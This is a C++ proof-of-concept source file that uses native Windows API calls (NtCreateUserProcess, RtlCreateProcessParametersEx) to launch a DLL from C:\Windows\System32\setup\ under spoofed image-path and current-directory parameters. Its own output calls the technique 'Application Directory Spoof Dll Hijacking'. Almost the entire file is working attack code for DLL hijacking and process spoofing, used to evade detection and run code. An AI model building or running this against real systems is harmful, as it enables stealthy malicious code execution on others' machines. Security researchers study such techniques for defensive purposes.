#include <iostream>
#include "ntapi.hpp"
#include "otherapi.hpp"

#define IMAGENAMEW L"RasMigPlugin.dll"
using namespace std;

// 用个有图标的dll，hhh->没想到dll的图标也有用 mfc*
// No Console Process Create "Console SubSystem" Process without conhost.exe
// int wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nShowCmd)
int wmain(int argc, wchar_t* argv[])
{
	NTSTATUS Status = 0;
	HANDLE hProcess = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID ClientId = { 0 };

	// Faultrep.dll!WerpInitiateCrashReporting
	wprintf(L"[!] All Credits to Octoberfest73 & snovvcrash !!!\n");
	wprintf(L"[!] Awesome Super Stable Application Directory Spoof Dll Hijacking!!!\n");
	wprintf(L"[!] Be aware of that my dll has enabled CFG!\n");

	wstring TempName = NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer;
	TempName += IMAGENAMEW;

	UNICODE_STRING spoofedImagePathName;
	RtlInitUnicodeStringEx(&spoofedImagePathName, TempName.c_str());

	UNICODE_STRING currentDirectory;
	RtlInitUnicodeStringEx(&currentDirectory, L"C:\\Windows\\System32\\setup\\");

	UNICODE_STRING commandLine;
	wstring CommonName = currentDirectory.Buffer;
	CommonName += IMAGENAMEW;
	RtlInitUnicodeStringEx(&commandLine, CommonName.c_str());// L"C:\\Windows\\System32\\WerFault.exe"

	UNICODE_STRING imagePathName;
	RtlInitUnicodeStringEx(&imagePathName, CommonName.c_str());// L"C:\\Windows\\System32\\WerFault.exe"

	UNICODE_STRING NtPath = { 0 };
	wstring NtImageName = L"\\??\\";
	NtImageName += imagePathName.Buffer;
	RtlInitUnicodeStringEx(&NtPath, NtImageName.c_str());

	PS_CREATE_INFO CreateInfo = { 0 };
	RtlSecureZeroMemory(&CreateInfo, sizeof(PS_CREATE_INFO));
	CreateInfo.State = PsCreateInitialState;
	CreateInfo.Size = sizeof(PS_CREATE_INFO);
	CreateInfo.InitState.u1.s1.WriteOutputOnExit = TRUE;
	CreateInfo.InitState.u1.s1.DetectManifest = TRUE;
	CreateInfo.InitState.AdditionalFileAccess = FILE_READ_ATTRIBUTES | FILE_READ_DATA;
	//CreateInfo.InitState.u1.s1.ProhibitedImageCharacteristics = IMAGE_FILE_DLL; lol

	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;

	Status = RtlCreateProcessParametersEx(
		&ProcessParameters,
		&spoofedImagePathName,
		NULL,                        // Create a new DLL path
		&currentDirectory,
		&commandLine,
		NULL,                        // If null, a new environment will be created
		&imagePathName,                  // Window title is the exe path - needed for console apps
		&NtCurrentPeb()->ProcessParameters->DesktopInfo, // Copy our desktop name
		NULL,
		NULL,
		RTL_USER_PROCESS_PARAMETERS_NORMALIZED
	);

	ProcessParameters->ConsoleHandle = HANDLE_DETACHED_PROCESS;

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"[-] RtlCreateProcessParametersEx Failed: 0x%08x\n", Status);
		return Status;
	}

	SECTION_IMAGE_INFORMATION SectionImageInfomation = { 0 };
	ULONG AttributeListCount = 3;
	SIZE_T TotalLength = AttributeListCount * sizeof(PS_ATTRIBUTE) + sizeof(SIZE_T);
	PS_ATTRIBUTE_LIST AttributeList;

	RtlSecureZeroMemory(&AttributeList, sizeof(PS_ATTRIBUTE_LIST));
	AttributeList.TotalLength = TotalLength;

	AttributeList.Attributes[0].Attribute = PsAttributeValue(PsAttributeImageName, FALSE, TRUE, FALSE);
	AttributeList.Attributes[0].Size = NtPath.Length;
	AttributeList.Attributes[0].Value = (ULONG_PTR)NtPath.Buffer;

	AttributeList.Attributes[1].Attribute = PsAttributeValue(PsAttributeImageInfo, FALSE, FALSE, FALSE);
	AttributeList.Attributes[1].Size = sizeof(SECTION_IMAGE_INFORMATION);
	AttributeList.Attributes[1].ValuePtr = &SectionImageInfomation;

	AttributeList.Attributes[2].Attribute = PsAttributeValue(PsAttributeClientId, TRUE, FALSE, FALSE);
	AttributeList.Attributes[2].Size = sizeof(CLIENT_ID);
	AttributeList.Attributes[2].Value = (ULONG_PTR)&ClientId;

	Status = NtCreateUserProcess(&hProcess, &hThread, MAXIMUM_ALLOWED, MAXIMUM_ALLOWED, NULL, NULL, 0, THREAD_CREATE_FLAGS_CREATE_SUSPENDED, ProcessParameters, &CreateInfo, &AttributeList);
	wprintf(L"[*] Status: 0x%08lx\n", Status);

	//Sleep(5000);
	int i = getchar();
	
	NtResumeThread(hThread, NULL);

	wprintf(L"[*] %ls-> PID=%lld, TID=%lld\n", imagePathName.Buffer, (ULONGLONG)ClientId.UniqueProcess, (ULONGLONG)ClientId.UniqueThread);
	wprintf(L"Last Win32Error: %ld\n", NtCurrentTeb()->LastErrorValue);
	wprintf(L"Last NtstatusError: 0x%08lx\n", NtCurrentTeb()->LastStatusValue);

	i = getchar();
	//Sleep(15000);

	return Status;
}